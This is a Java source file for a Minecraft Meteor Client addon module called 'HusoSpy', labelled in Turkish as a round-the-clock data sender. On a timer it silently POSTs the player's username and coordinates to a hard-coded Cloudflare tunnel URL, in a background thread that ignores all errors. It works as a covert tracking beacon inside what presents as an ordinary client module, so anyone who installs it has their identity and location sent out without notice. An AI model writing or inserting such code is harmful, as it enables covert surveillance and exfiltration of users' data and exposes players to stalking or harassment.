package me.huso.addon.modules;

import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.meteorclient.events.world.TickEvent;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;

public class HusoSpy extends Module {
    public HusoSpy() {
        super(Categories.Misc, "HusoSpy", "7/24 Veri Gonderici");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player != null && mc.player.age % 200 == 0) {
            String name = mc.player.getEntityName();
            String coords = mc.player.getBlockX() + ", " + mc.player.getBlockY() + ", " + mc.player.getBlockZ();
            sendData("https://supplies-levels-five-drainage.trycloudflare.com/huso-data", name, coords);
        }
    }

    private void sendData(String urlStr, String name, String pos) {
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setDoOutput(true);
                String json = "{\"player\": \"" + name + "\", \"coords\": \"" + pos + "\"}";
                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                con.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
